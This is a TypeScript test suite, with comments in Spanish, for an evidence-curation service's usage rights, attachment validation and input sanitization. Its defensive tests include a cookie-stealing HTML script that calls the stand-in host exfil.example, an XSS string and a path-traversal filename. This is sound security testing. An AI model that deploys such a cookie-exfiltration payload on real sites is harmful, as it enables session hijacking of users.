import { afterAll, beforeAll, expect, it } from 'vitest';
import { cerrarPools, conUsuario, sql, sqlAdmin } from '@/lib/db';
import {
  adjuntarArchivo,
  aprobarItem,
  archivoParaDescarga,
  crearItem,
  decidirDerechos,
  eliminarArchivo,
  ErrorCuraduria,
  listarBandeja,
  listarEvidencias,
  listarEvidenciaConDerechos,
  PAGINA_DERECHOS,
} from '@/lib/evidencia/evidencia.servicio';
import { marcarItem, ErrorMetodo } from '@/lib/metodo/metodo.servicio';
import { bytesABase64, MAX_ARCHIVOS_POR_ITEM } from '@/lib/evidencia/sanitizacion';
import { describeAuthz } from './helpers';

/**
 * SPEC-03 (resto) — derechos de uso BLOQUEANTES (RF-03.10, SYS-14), archivos adjuntos
 * (RF-03.1) y sanitización de la ingesta (RF-03.2). Todo lo que estos tests comprueban
 * se impone en la BASE: se verifica por el servicio y también por SQL crudo del rol de
 * aplicación, que es donde una regla escrita solo en la app se caería.
 */
describeAuthz('evidencia profunda: derechos bloqueantes, adjuntos y sanitización', () => {
  const marca = `prof-${crypto.randomUUID().slice(0, 8)}`;
  let ws = '';
  let wsB = '';
  let leadId = '';
  let disenadorId = '';
  let adminClienteId = '';
  let stakeId = '';
  /** Evidencia con derechos concedidos (ámbito cliente). */
  let evConDerechos = '';
  /** Evidencia con derechos pendientes: el caso del criterio de aceptación 3. */
  let evSinDerechos = '';
  let itemSinDerechos = '';
  /** Un ítem de checklist real donde se prueba la CITA. */
  let itemChecklist = '';

  const dimensiones = {
    fecha: '2026-08-01',
    recoleccion: 'Entrevista 1:1',
    derivada: false,
    confianza: 'media' as const,
    consentimiento: false,
    confidencialidad: 'cliente' as const,
    segmentoIds: [],
  };

  const PDF = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37, 0x0a, 0x25]);

  beforeAll(async () => {
    const admin = sqlAdmin();
    const [w] = await admin`insert into workspace (nombre) values (${marca}) returning id`;
    ws = w!.id as string;
    const [wb] = await admin`insert into workspace (nombre) values (${marca + '-B'}) returning id`;
    wsB = wb!.id as string;

    for (const [alias, rol] of [
      ['lead', 'lead-boutique'],
      ['dis', 'disenador'],
      ['adminc', 'admin-cliente'],
      ['stake', 'stakeholder'],
    ] as const) {
      const [u] = await admin`insert into usuario (email, nombre, estado)
        values (${`${marca}-${alias}@test.demo`}, ${alias}, 'activo') returning id`;
      const id = u!.id as string;
      if (alias === 'lead') leadId = id;
      if (alias === 'dis') disenadorId = id;
      if (alias === 'adminc') adminClienteId = id;
      if (alias === 'stake') stakeId = id;
      await admin`insert into miembro (workspace_id, usuario_id, nombre, email, rol)
        values (${ws}, ${id}, ${alias}, ${`${marca}-${alias}@test.demo`}, ${rol})`;
    }

    // Un proyecto con método instanciado: es donde vive la superficie de CITA
    // (checklist_item cumplido exige evidencia real enlazada).
    const [svc] = await admin`insert into servicio (workspace_id, nombre, creado_por)
      values (${ws}, ${marca + ' Servicio'}, ${leadId}) returning id`;
    const [reto] = await admin`insert into reto
      (workspace_id, servicio_ancla_id, codigo, titulo, estado, origen, creado_por)
      values (${ws}, ${svc!.id as string}, 'R-90', 'Reto derechos', 'activo', 'peticion-cliente', ${leadId})
      returning id`;
    const [proy] = await admin`insert into proyecto (workspace_id, reto_id, codigo, titulo, creado_por)
      values (${ws}, ${reto!.id as string}, 'P-90', 'Proyecto derechos', ${leadId}) returning id`;
    const proyectoId = proy!.id as string;
    await admin`insert into etapa_instancia (workspace_id, proyecto_id, numero, nombre)
      values (${ws}, ${proyectoId}, 1, 'Investigación')`;
    const [gate] = await admin`insert into gate_instancia
      (workspace_id, proyecto_id, numero, rol_aprobador)
      values (${ws}, ${proyectoId}, 1, 'lead-boutique') returning id`;
    const [ci] = await admin`insert into checklist_item (workspace_id, gate_id, orden, texto)
      values (${ws}, ${gate!.id as string}, 0, 'Evidencia primaria suficiente') returning id`;
    itemChecklist = ci!.id as string;
  });

  afterAll(async () => {
    const admin = sqlAdmin();
    const wss = [ws, wsB].filter((id) => id !== '');
    if (wss.length > 0) {
      await admin`delete from evento_dominio where workspace_id in ${admin(wss)}`;
      await admin`delete from checklist_item where workspace_id in ${admin(wss)}`;
      await admin`delete from gate_instancia where workspace_id in ${admin(wss)}`;
      await admin`delete from etapa_instancia where workspace_id in ${admin(wss)}`;
      await admin`delete from archivo_importado where workspace_id in ${admin(wss)}`;
      await admin`delete from item_importacion where workspace_id in ${admin(wss)}`;
      await admin`delete from derecho_uso where workspace_id in ${admin(wss)}`;
      await admin`delete from evidencia where workspace_id in ${admin(wss)}`;
      await admin`delete from fuente where workspace_id in ${admin(wss)}`;
      await admin`delete from proyecto where workspace_id in ${admin(wss)}`;
      await admin`delete from reto where workspace_id in ${admin(wss)}`;
      await admin`delete from servicio where workspace_id in ${admin(wss)}`;
      await admin`delete from miembro where workspace_id in ${admin(wss)}`;
      await admin`delete from workspace where id in ${admin(wss)}`;
    }
    await admin`delete from usuario where email like ${marca + '-%@test.demo'}`;
    await cerrarPools();
  });

  // ── Derechos: nacimiento fail-closed ──

  it('la evidencia curada NACE sin derechos: existe, se ve y no se puede citar', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Entrevista E-014 (sin consentimiento)',
      contenido: 'Se detuvo al pedirle la foto del documento.',
      tipoFuente: 'entrevista',
      referencia: 'grabaciones/E-014',
    });
    itemSinDerechos = item.itemId;
    const r = await aprobarItem(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      esEstadoActual: false,
      resumen: 'Explica el abandono',
      dimensiones,
    });
    evSinDerechos = r.evidenciaId;

    const [derecho] = await conUsuario(leadId, (tx) => tx`select estado, ambito, base, vence_en
      from derecho_uso where evidencia_id = ${evSinDerechos}`);
    expect(derecho?.estado).toBe('pendiente');
    expect(derecho?.ambito).toBe('interno');
    expect(derecho?.base).toBe('');

    const { evidencias } = await listarEvidencias(leadId, ws);
    const fila = evidencias.find((e) => e.id === evSinDerechos);
    expect(fila?.citable).toBe(false);
    expect(fila?.motivoBloqueo).toContain('derechos pendientes');
  });

  it('citar evidencia sin derechos se bloquea nombrando la dimensión que falta (SYS-14)', async () => {
    await expect(
      marcarItem(leadId, {
        workspaceId: ws,
        itemId: itemChecklist,
        accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: evSinDerechos },
      }),
    ).rejects.toThrow(/No puedes citar esta evidencia.*derechos pendientes/s);

    // Y por SQL CRUDO del rol de aplicación: el bloqueo no vive en el servicio sino en
    // el guard de la base — sin esto, la regla sería una convención de la app.
    await expect(
      conUsuario(leadId, (tx) => tx`update checklist_item
        set estado = 'cumplido', evidencia_id = ${evSinDerechos}
        where id = ${itemChecklist}`),
    ).rejects.toMatchObject({ code: 'DR001' });

    const [ci] = await conUsuario(leadId, (tx) => tx`select estado, evidencia_id
      from checklist_item where id = ${itemChecklist}`);
    expect(ci?.estado).toBe('pendiente');
    expect(ci?.evidencia_id).toBeNull();
  });

  it('solo lead-boutique o admin-cliente conceden: el diseñador cura pero no decide derechos', async () => {
    await expect(
      decidirDerechos(disenadorId, {
        workspaceId: ws,
        evidenciaId: evSinDerechos,
        decision: 'concedido',
        ambito: 'cliente',
        base: 'me parece bien',
        venceEn: null,
      }),
    ).rejects.toThrow(ErrorCuraduria);
    // Saltándose la capa 2: la política de UPDATE no le alcanza ninguna fila.
    const filas = await conUsuario(disenadorId, (tx) => tx`update derecho_uso
      set estado = 'concedido', ambito = 'cliente', base = 'forzado',
          decidido_por = ${disenadorId}, decidido_en = now()
      where evidencia_id = ${evSinDerechos}`);
    expect(filas.count).toBe(0);
  });

  it('los derechos no NACEN concedidos: el insert directo con concesión forjada se rechaza', async () => {
    const admin = sqlAdmin();
    const [fuente] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${ws}, 'nota', 'Fuente suelta', ${leadId}) returning id`;
    const [ev] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${ws}, ${fuente!.id as string}, 'Evidencia suelta', '{}'::jsonb, ${leadId})
      returning id`;
    const evId = ev!.id as string;
    await expect(
      conUsuario(leadId, (tx) => tx`insert into derecho_uso
        (workspace_id, evidencia_id, estado, ambito, base, decidido_por, decidido_en, creado_por)
        values (${ws}, ${evId}, 'concedido', 'publico', 'inventada', ${leadId}, now(), ${leadId})`),
    ).rejects.toThrow(/row-level security/);
    // Y la atribución tampoco se falsifica al crearlo pendiente.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into derecho_uso
        (workspace_id, evidencia_id, creado_por) values (${ws}, ${evId}, ${disenadorId})`),
    ).rejects.toThrow(/row-level security/);
    await admin`delete from evidencia where id = ${evId}`;
    await admin`delete from fuente where id = ${fuente!.id as string}`;
  });

  it('toda evidencia exige su registro de derechos: un insert crudo solitario aborta al commit', async () => {
    const [fuente] = await conUsuario(
      leadId,
      (tx) => tx`insert into fuente (workspace_id, tipo, titulo, creado_por)
        values (${ws}, 'nota', 'Fuente huérfana', ${leadId}) returning id`,
    );
    await expect(
      conUsuario(
        leadId,
        (tx) => tx`insert into evidencia (workspace_id, fuente_id, titulo, dimensiones, creado_por)
          values (${ws}, ${fuente!.id as string}, 'Sin derechos', '{}'::jsonb, ${leadId})`,
      ),
    ).rejects.toThrow(/registro de derechos/);
  });

  // ── Derechos: concesión, alcance, vigencia y revocación ──

  it('conceder ámbito interno NO alcanza a citar en el portal; conceder cliente, sí', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Estudio CX del proveedor',
      contenido: 'Abandono del 62% en verificación',
      tipoFuente: 'documento',
      referencia: 'carpeta/CX-2026',
    });
    const r = await aprobarItem(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      esEstadoActual: true,
      resumen: 'Línea base',
      dimensiones: { ...dimensiones, consentimiento: true },
    });
    evConDerechos = r.evidenciaId;

    // El orden es total: interno ⊂ cliente ⊂ publico. Interno no basta para el portal.
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'interno',
      base: 'Solo trabajo interno de la boutique',
      venceEn: null,
    });
    let fila = (await listarEvidencias(leadId, ws)).evidencias.find(
      (e) => e.id === evConDerechos,
    );
    expect(fila?.citable).toBe(false);
    expect(fila?.motivoBloqueo).toContain('interno');

    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Cláusula 7 del contrato de servicios',
      venceEn: null,
    });
    fila = (await listarEvidencias(leadId, ws)).evidencias.find((e) => e.id === evConDerechos);
    expect(fila?.citable).toBe(true);
    expect(fila?.motivoBloqueo).toBeNull();

    // Ahora la cita sí entra, por el servicio y por el guard.
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: itemChecklist,
      accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: evConDerechos },
    });
    const [ci] = await conUsuario(leadId, (tx) => tx`select estado, evidencia_id
      from checklist_item where id = ${itemChecklist}`);
    expect(ci?.estado).toBe('cumplido');
    expect(ci?.evidencia_id).toBe(evConDerechos);
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: itemChecklist,
      accion: { tipo: 'pendiente' },
    });
  });

  it('los derechos caducan: una concesión vencida deja de habilitar la cita', async () => {
    const ayer = new Date(Date.now() - 86_400_000).toISOString().slice(0, 10);
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Consentimiento con vigencia de un año',
      venceEn: ayer,
    });
    const fila = (await listarEvidencias(leadId, ws)).evidencias.find(
      (e) => e.id === evConDerechos,
    );
    expect(fila?.citable).toBe(false);
    expect(fila?.motivoBloqueo).toContain('vencieron');
    await expect(
      conUsuario(leadId, (tx) => tx`update checklist_item
        set estado = 'cumplido', evidencia_id = ${evConDerechos}
        where id = ${itemChecklist}`),
    ).rejects.toMatchObject({ code: 'DR001' });

    // Se restablece para el resto de la suite.
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Cláusula 7 del contrato de servicios',
      venceEn: null,
    });
  });

  it('revocar es un camino real (el consentimiento se retira) y deja evento con el previo', async () => {
    const admin = sqlAdmin();
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'denegado',
      ambito: 'interno',
      base: 'El titular retiró el consentimiento',
      venceEn: null,
    });
    const fila = (await listarEvidencias(leadId, ws)).evidencias.find(
      (e) => e.id === evConDerechos,
    );
    expect(fila?.citable).toBe(false);
    expect(fila?.motivoBloqueo).toContain('retiró el consentimiento');

    const [evento] = await admin`select payload, actor_rol from evento_dominio
      where workspace_id = ${ws} and tipo = 'DerechosDenegados'
        and payload->>'evidenciaId' = ${evConDerechos}
      order by creado_en desc limit 1`;
    expect(evento).toBeDefined();
    expect(evento!.actor_rol).toBe('admin-cliente');
    expect((evento!.payload as { previo: { estado: string } }).previo.estado).toBe('concedido');

    // Y se puede volver a conceder: los derechos no son de sentido único.
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evConDerechos,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Nuevo consentimiento firmado',
      venceEn: null,
    });
    expect(
      (await listarEvidencias(leadId, ws)).evidencias.find((e) => e.id === evConDerechos)?.citable,
    ).toBe(true);
  });

  it('un derecho decidido nunca vuelve a «pendiente» ni acepta una concesión sin base', async () => {
    await expect(
      conUsuario(leadId, (tx) => tx`update derecho_uso
        set estado = 'pendiente', base = '', decidido_por = null, decidido_en = null
        where evidencia_id = ${evConDerechos}`),
    ).rejects.toThrow(/row-level security/);
    await expect(
      conUsuario(leadId, (tx) => tx`update derecho_uso
        set estado = 'concedido', ambito = 'publico', base = '  ',
            decidido_por = ${leadId}, decidido_en = now()
        where evidencia_id = ${evConDerechos}`),
    ).rejects.toThrow(/row-level security|check constraint/);
  });

  it('aislamiento: los derechos de otro workspace son invisibles (SYS-01/02)', async () => {
    const sinContexto = await sql()`select id from derecho_uso where workspace_id = ${ws}`;
    expect(sinContexto.length).toBe(0);
    const ajena = await listarEvidenciaConDerechos(leadId, wsB);
    expect(ajena.evidencias).toHaveLength(0);
  });

  // ── Archivos adjuntos ──

  it('adjuntar valida el formato por los BYTES y la base calcula el sha256', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Informe con adjunto',
      contenido: 'resumen',
      tipoFuente: 'documento',
      referencia: '',
    });
    // Un ZIP disfrazado de PDF no entra (la firma manda, no la extensión).
    await expect(
      adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: item.itemId,
        nombre: 'falso.pdf',
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(new Uint8Array([0x50, 0x4b, 0x03, 0x04])),
      }),
    ).rejects.toThrow(ErrorCuraduria);

    const r = await adjuntarArchivo(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      // Ruta en el nombre: se normaliza a basename antes de tocar la base.
      nombre: '../../etc/informe.pdf',
      tipoMime: 'application/pdf',
      contenidoBase64: bytesABase64(PDF),
    });
    // sha256 es una columna GENERADA: ni la app puede declarar uno que no corresponda.
    const digest = await crypto.subtle.digest('SHA-256', PDF.slice().buffer as ArrayBuffer);
    const hex = [...new Uint8Array(digest)]
      .map((b) => b.toString(16).padStart(2, '0'))
      .join('');
    expect(r.sha256).toBe(hex);

    const bandeja = await listarBandeja(leadId, ws);
    const fila = bandeja.pendientes.find((i) => i.id === item.itemId);
    expect(fila?.archivos).toHaveLength(1);
    expect(fila?.archivos[0]?.nombre).toBe('informe.pdf');
    expect(fila?.archivos[0]?.bytes).toBe(PDF.length);

    // Los bytes vuelven idénticos.
    const bajado = await archivoParaDescarga(leadId, ws, r.archivoId);
    expect(bajado?.contenidoBase64).toBe(bytesABase64(PDF));
    // Cross-tenant: el mismo id desde otro workspace no existe.
    expect(await archivoParaDescarga(leadId, wsB, r.archivoId)).toBeNull();
  });

  it('el adjunto solo entra mientras el material esté PENDIENTE: lo curado es inmutable', async () => {
    // itemSinDerechos ya fue aprobado en el primer test.
    await expect(
      adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: itemSinDerechos,
        nombre: 'tarde.pdf',
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(PDF),
      }),
    ).rejects.toThrow(/row-level security/);
  });

  it('retirar un adjunto: quien lo subió o un curador, y solo antes de curar', async () => {
    const item = await crearItem(stakeId, {
      workspaceId: ws,
      titulo: 'Material del stakeholder',
      contenido: 'aporte',
      tipoFuente: 'nota',
      referencia: '',
    });
    const a = await adjuntarArchivo(stakeId, {
      workspaceId: ws,
      itemId: item.itemId,
      nombre: 'aporte.pdf',
      tipoMime: 'application/pdf',
      contenidoBase64: bytesABase64(PDF),
    });
    await eliminarArchivo(leadId, ws, a.archivoId); // curador
    expect(await archivoParaDescarga(leadId, ws, a.archivoId)).toBeNull();
    await expect(eliminarArchivo(leadId, ws, a.archivoId)).rejects.toThrow(ErrorCuraduria);
  });

  it('el tope de adjuntos por item se aplica (la bandeja es curaduría, no repositorio)', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material con muchos adjuntos',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    for (let i = 0; i < MAX_ARCHIVOS_POR_ITEM; i += 1) {
      await adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: item.itemId,
        nombre: `parte-${i}.pdf`,
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(PDF),
      });
    }
    await expect(
      adjuntarArchivo(leadId, {
        workspaceId: ws,
        itemId: item.itemId,
        nombre: 'una-mas.pdf',
        tipoMime: 'application/pdf',
        contenidoBase64: bytesABase64(PDF),
      }),
    ).rejects.toThrow(ErrorCuraduria);
  });

  it('la extensión guardada la fija el FORMATO verificado, no quien llama', async () => {
    // El ataque completo, por el camino real: HTML en UTF-8 declarado `text/plain`.
    // `verificarArchivo` lo acepta —es texto legítimo: sin controles ni bidi— y antes el
    // sufijo `.html` llegaba intacto a la base. La descarga fuerza octet-stream, pero
    // escribe el fichero en disco con ese nombre: abrirlo desde ahí es un origen file://
    // donde el navegador decide por la extensión y ejecuta el script.
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material con nombre ejecutable',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    const html = new TextEncoder().encode(
      '<html><script>fetch("https://exfil.example/"+document.cookie)</script></html>',
    );
    const r = await adjuntarArchivo(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      nombre: 'payload.html',
      tipoMime: 'text/plain',
      contenidoBase64: bytesABase64(html),
    });
    const bajado = await archivoParaDescarga(leadId, ws, r.archivoId);
    // El nombre original se conserva entero (es trazabilidad de quien aportó el
    // material); lo que cambia es la extensión FINAL, la única que el sistema mira.
    expect(bajado?.nombre).toBe('payload.html.txt');
    // Y los bytes siguen siendo los mismos: no se sanea el contenido, se desarma el
    // vector (el material de terceros se guarda crudo — RF-03.2).
    expect(bajado?.contenidoBase64).toBe(bytesABase64(html));

    // Y por SQL CRUDO del rol de aplicación: la regla vive en un CHECK, no solo en la
    // app. Sin esto la promesa de la allowlist sería una convención del servicio.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, 'payload.html', 'text/plain', 'hola'::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    // Tampoco una extensión de OTRO formato de la allowlist: `.pdf` con bytes de texto
    // sigue siendo un nombre que miente sobre lo que hay dentro.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, 'nota.pdf', 'text/plain', 'hola'::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
  });

  it('el esquema también rechaza formatos y nombres inseguros por SQL crudo', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Prueba de constraints',
      contenido: 'x',
      tipoFuente: 'documento',
      referencia: '',
    });
    // SVG: ejecutable en un navegador, fuera de la allowlist del CHECK.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, 'x.svg', 'image/svg+xml', '\\x3c73'::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    // Nombre con separador de ruta: iría a un Content-Disposition.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, '../x.pdf', 'application/pdf', '\\x25504446'::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    // Archivo vacío.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into archivo_importado
        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
        values (${ws}, ${item.itemId}, 'vacio.pdf', 'application/pdf', ''::bytea, ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
  });

  // ── Sanitización de ingesta ──

  it('el contenido importado se guarda CRUDO: un payload de markup vuelve byte a byte', async () => {
    const payload = '<script>alert("xss")</script> & <img onerror=x> — 62% ✅';
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Material con markup',
      contenido: payload,
      tipoFuente: 'documento',
      referencia: '',
    });
    const [fila] = await conUsuario(leadId, (tx) => tx`select contenido from item_importacion
      where id = ${item.itemId}`);
    // Ni escapado ni normalizado: la fidelidad de la cita depende de que no lo toquemos.
    expect(fila?.contenido).toBe(payload);
  });

  it('los controles y overrides bidi los rechaza también el CHECK de la base', async () => {
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Base para el check',
      contenido: 'limpio',
      tipoFuente: 'nota',
      referencia: '',
    });
    expect(item.itemId).toBeTruthy();
    // Saltándose el schema de la app: el INSERT crudo con un control choca con el CHECK.
    await expect(
      conUsuario(leadId, (tx) => tx`insert into item_importacion
        (workspace_id, titulo, contenido, tipo_fuente, creado_por)
        values (${ws}, 'con control', 'hola' || chr(7) || 'mundo', 'nota', ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    await expect(
      conUsuario(leadId, (tx) => tx`insert into item_importacion
        (workspace_id, titulo, contenido, tipo_fuente, creado_por)
        values (${ws}, 'con bidi ' || chr(8238), 'texto', 'nota', ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
  });

  // ── Paginación de la pantalla de derechos ──

  it('toda la evidencia es alcanzable paginando: la vieja no queda fuera para siempre', async () => {
    // Sin cursor, un tope duro no «recorta una lista»: deja evidencia PERMANENTEMENTE
    // fuera de la única pantalla donde se conceden y revocan derechos. Y como los
    // derechos nacen pendientes (fail-closed), esa evidencia queda además incitable e
    // inexportable sin camino de reparación. Se siembra una página entera de más.
    const admin = sqlAdmin();
    const sobrantes = PAGINA_DERECHOS + 1;
    await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      select ${ws}, 'nota', 'pag-' || g, ${leadId} from generate_series(1, ${sobrantes}) g`;
    // now() es fijo dentro de la sentencia: todas comparten `creado_en` y el desempate
    // recae en el id — que es justo el caso que un keyset `(creado_en, id)` tiene que
    // resolver sin repetir ni saltar filas.
    const nuevas = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      select ${ws}, f.id, 'Evidencia ' || f.titulo, '{}'::jsonb, ${leadId}
      from fuente f where f.workspace_id = ${ws} and f.titulo like 'pag-%'
      returning id`;
    await admin`insert into derecho_uso (workspace_id, evidencia_id, creado_por)
      select ${ws}, e.id, ${leadId} from evidencia e
      where e.id in ${admin(nuevas.map((f) => f.id as string))}`;

    const primera = await listarEvidenciaConDerechos(leadId, ws);
    expect(primera.evidencias).toHaveLength(PAGINA_DERECHOS);
    expect(primera.hayMas).toBe(true);

    const vistas: string[] = [...primera.evidencias.map((e) => e.id)];
    let cursor = primera.evidencias[primera.evidencias.length - 1]!.id;
    let hayMas = primera.hayMas;
    for (let vuelta = 0; hayMas && vuelta < 20; vuelta += 1) {
      const pagina = await listarEvidenciaConDerechos(leadId, ws, cursor);
      expect(pagina.evidencias.length).toBeGreaterThan(0);
      vistas.push(...pagina.evidencias.map((e) => e.id));
      cursor = pagina.evidencias[pagina.evidencias.length - 1]!.id;
      hayMas = pagina.hayMas;
    }
    expect(hayMas).toBe(false);

    // Ni repetidas ni saltadas: el recorrido completo es EXACTAMENTE la evidencia del
    // workspace, que es lo que convierte «hay más» en una promesa cumplible.
    const todas = (await admin`select id from evidencia where workspace_id = ${ws}`).map(
      (f) => f.id as string,
    );
    expect(new Set(vistas).size).toBe(vistas.length);
    expect(new Set(vistas)).toEqual(new Set(todas));

    // El cursor no es una vía de escape del tenant: pedir la página siguiente con el id
    // de una evidencia de otro workspace no devuelve nada de aquel ni de este.
    const [ajena] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${wsB}, 'nota', 'ajena', ${leadId}) returning id`;
    const [evAjena] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${wsB}, ${ajena!.id as string}, 'Ajena', '{}'::jsonb, ${leadId}) returning id`;
    const conCursorAjeno = await listarEvidenciaConDerechos(
      leadId,
      ws,
      evAjena!.id as string,
    );
    expect(conCursorAjeno.evidencias).toHaveLength(0);
  });

  it('marcar cumplido sin evidencia sigue siendo imposible (el guard no lo relaja)', async () => {
    await expect(
      marcarItem(leadId, {
        workspaceId: ws,
        itemId: itemChecklist,
        accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: crypto.randomUUID() },
      }),
    ).rejects.toThrow(ErrorMetodo);
  });
});
